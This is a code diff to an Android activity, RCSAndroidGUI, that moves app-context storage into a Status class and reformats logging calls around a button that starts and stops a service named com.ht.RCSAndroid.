@@ -27,29 +27,17 @@ import com.ht.RCSAndroidGUI.utils.Check;
  */
 public class RCSAndroidGUI extends Activity {
 
-	/** The context. */
-	private static Context context;
-
-	/**
-	 * Gets the app context.
-	 *
-	 * @return the app context
-	 */
-	public static Context getAppContext() {
-		Check.requires(context != null, "Null Context");
-		return context;
-	}
-
 	/**
 	 * Called when the activity is first created.
-	 *
-	 * @param savedInstanceState the saved instance state
+	 * 
+	 * @param savedInstanceState
+	 *            the saved instance state
 	 */
 	@Override
 	public void onCreate(final Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 		setContentView(R.layout.main);
-		context = getApplicationContext();
+		Status.setAppContext( getApplicationContext( ));
 
 		// Set up click listeners
 		final Button runButton = (Button) findViewById(R.id.btntoggle);
@@ -64,8 +52,9 @@ public class RCSAndroidGUI extends Activity {
 						if (cn == null) {
 							Log.d("RCS", "RCS Service not started");
 						} else {
-							Log.d("RCS", "RCS Service Name: "
-									+ cn.flattenToShortString());
+							Log.d("RCS",
+									"RCS Service Name: "
+											+ cn.flattenToShortString());
 						}
 					} catch (final SecurityException se) {
 						Log.d("RCS",
@@ -74,13 +63,11 @@ public class RCSAndroidGUI extends Activity {
 				} else {
 					try {
 						if (stopService(new Intent("com.ht.RCSAndroid")) == true) {
-							Log
-									.d("RCS",
-											"RCS Service com.ht.RCSAndroid/.RCSAndroid stopped");
+							Log.d("RCS",
+									"RCS Service com.ht.RCSAndroid/.RCSAndroid stopped");
 						} else {
-							Log
-									.d("RCS",
-											"RCS Service com.ht.RCSAndroid/.RCSAndroid doesn't exist");
+							Log.d("RCS",
+									"RCS Service com.ht.RCSAndroid/.RCSAndroid doesn't exist");
 						}
 					} catch (final SecurityException se) {
 						Log.d("RCS",
